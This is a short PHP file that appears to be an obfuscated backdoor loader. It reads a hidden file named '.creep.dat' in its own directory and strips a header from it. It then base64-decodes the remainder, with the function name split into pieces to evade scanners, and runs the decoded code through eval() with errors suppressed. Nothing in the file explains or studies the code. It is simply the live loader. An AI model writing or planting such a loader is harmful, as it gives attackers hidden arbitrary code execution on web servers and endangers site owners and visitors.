<?php
$x='.creep.dat';$d=__DIR__.'/'.$x;$h=@file_get_contents($d);
if($h){$a='base'.'64_'.'dec'.'ode';
$c=$a(substr($h,13));if(strpos($c,'<?php')===0)$c=substr($c,5);
$g=function()use($c){eval($c);};$g();}
